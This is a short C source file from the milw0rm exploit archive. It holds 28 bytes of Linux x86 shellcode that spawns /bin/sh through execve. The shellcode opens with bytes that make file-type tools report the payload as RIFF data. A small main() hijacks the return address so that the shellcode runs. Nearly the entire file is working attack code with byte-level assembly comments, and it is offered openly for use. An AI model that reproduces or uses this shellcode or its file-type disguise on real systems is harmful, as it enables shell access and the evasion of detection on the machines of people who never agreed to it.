/*
 * (linux/x86) - execve("/bin/sh", ["/bin/sh", NULL]) + RIFF Header - 28 bytes
 *
 * root@magicbox:~# file linux-sh-riffhdr.bin
 * linux-sh-riffhdr.bin: RIFF (little-endian) data
 *
 * - izik <izik@tty64.org>
 */

char shellcode[] =

	//
	// RIFF Header (5 bytes)
	//

	"\x52"                  // push %edx
	"\x49"                  // dec %ecx
	"\x46"                  // inc %esi
	"\x46"                  // inc %esi
	"\x40"                  // inc %eax

	//
	// execve("/bin/sh", ["/bin/sh", NULL]);
	//

	"\x6a\x0b"              // push $0xb
	"\x58"                  // pop %eax
	"\x99"                  // cltd
	"\x52"                  // push %edx
	"\x68\x2f\x2f\x73\x68"  // push $0x68732f2f
	"\x68\x2f\x62\x69\x6e"  // push $0x6e69622f
	"\x89\xe3"              // mov %esp,%ebx
	"\x52"                  // push %edx
	"\x53"                  // push %ebx
	"\x89\xe1"              // mov %esp,%ecx
	"\xcd\x80";             // int $0x80

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}

// milw0rm.com [2006-04-17]